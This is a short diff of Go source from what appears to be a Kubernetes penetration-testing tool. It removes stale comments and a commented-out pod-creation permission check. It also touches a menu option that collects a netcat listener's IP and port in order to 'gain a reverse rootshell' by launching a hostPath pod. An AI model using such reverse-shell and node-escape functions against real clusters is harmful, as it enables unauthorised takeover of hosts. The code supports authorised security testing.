@@ -297,8 +297,6 @@ func PrintNamespaces(connectionString ServerInfo) []string {
 
 	var namespaces []string
 
-	// TODO: Add checking to make sure you're authorized to get namespaces
-
 	NamespacesRaw, _, err := runKubectlSimple(connectionString, "get", "namespaces")
 	if err != nil {
 		fmt.Printf("[-] Error while getting namespaces: %s\n", err.Error())
@@ -1251,20 +1249,13 @@ Peirates:># `)
 		// [20] Gain a reverse rootshell by launching a hostPath / pod
 		case "20":
 			allPods := getPodList(connectionString)
-			// TODO: See if we can put the auth check back
-			//podCreation := canCreatePods(connectionString)
-			//podCreation:= true
-			//if ! podCreation {
-			//	println(" This token cannot create pods on the cluster")
-			//	break
-			//}
-			//crontabPersistExec(allPods, connectionString)
 			println("What IP and Port will your netcat listener be listening on?")
 			var ip, port string
 			println("IP:")
 			fmt.Scanln(&ip)
 			println("Port:")
 			fmt.Scanln(&port)
+			// TODO: Rename/refactor MountRootFS so we get more capabilities in case the node does not run cron
 			MountRootFS(allPods, connectionString, ip, port)
 			break
 
